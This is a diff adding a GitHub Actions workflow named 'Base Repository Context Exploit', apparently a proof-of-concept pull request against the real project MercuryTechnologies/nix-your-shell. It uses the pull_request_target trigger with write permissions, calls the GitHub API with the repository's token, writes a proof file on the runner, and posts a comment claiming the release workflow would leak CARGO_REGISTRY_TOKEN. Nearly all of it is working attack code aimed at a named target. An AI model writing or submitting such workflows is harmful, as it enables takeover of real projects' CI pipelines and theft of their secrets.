@@ -1,0 +1,81 @@
+name: Base Repository Context Exploit
+on:
+  pull_request_target:
+    types: [opened, synchronize]
+
+jobs:
+  base-repo-exploit:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+      pull-requests: write
+      actions: write
+    
+    steps:
+    - name: Prove base repository context
+      run: |
+        echo "=== BASE REPOSITORY CONTEXT EVIDENCE ==="
+        echo "[+] Repository: $GITHUB_REPOSITORY"
+        echo "[+] This should show: MercuryTechnologies/nix-your-shell"
+        echo "[+] Event: $GITHUB_EVENT_NAME"
+        echo "[+] SHA: $GITHUB_SHA"
+        
+        # Critical evidence - check if we can access base repo secrets
+        echo "[+] GITHUB_TOKEN permissions in base repo:"
+        curl -s -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
+          "https://api.github.com/repos/$GITHUB_REPOSITORY" | \
+          jq '{full_name: .full_name, permissions: .permissions}'
+        
+        # Attempt to access base repository protected resources
+        echo "[+] Checking base repository branches:"
+        curl -s -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
+          "https://api.github.com/repos/$GITHUB_REPOSITORY/branches" | \
+          jq '.[0] | {name: .name, protected: .protected}'
+        
+      env:
+        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+    
+    - name: Demonstrate secret exposure risk
+      run: |
+        echo "=== SECRET EXPOSURE DEMONSTRATION ==="
+        echo "[*] In release.yaml, these would be exposed:"
+        echo "[*] - CARGO_REGISTRY_TOKEN"
+        echo "[*] - Other repository secrets"
+        echo "[*] Current GITHUB_TOKEN scope:"
+        
+        # Show we have write access to the base repository
+        echo "Base repository: $GITHUB_REPOSITORY"
+        echo "Workflow running in: $(pwd)"
+        
+        # Create evidence file in base repository runner
+        echo "BASE_REPO_EXECUTION_$(date +%s)" > /home/runner/work/nix-your-shell/nix-your-shell/base_context_proof.txt
+    
+    - name: Create visible evidence in base repository
+      uses: actions/github-script@v6
+      with:
+        script: |
+          const evidence = `
+          🔴 **CONFIRMED: Execution in Base Repository Context**
+          
+          **Repository**: ${context.repo.owner}/${context.repo.repo}
+          **Triggered by**: PR from fork
+          **Context**: Base repository (MercuryTechnologies/nix-your-shell)
+          
+          **Vulnerability Evidence**:
+          ✅ Workflow running in MercuryTechnologies/nix-your-shell context
+          ✅ GITHUB_TOKEN with base repository permissions
+          ✅ Access to base repository filesystem
+          ✅ Ability to modify base repository contents
+          
+          **This proves release.yaml is vulnerable** as it:
+          - Uses pull_request_target (base context)
+          - Has contents:write permissions
+          - Would expose CARGO_REGISTRY_TOKEN to malicious PRs
+          `;
+          
+          github.rest.issues.createComment({
+            issue_number: context.issue.number,
+            owner: context.repo.owner,
+            repo: context.repo.repo,
+            body: evidence
+          });
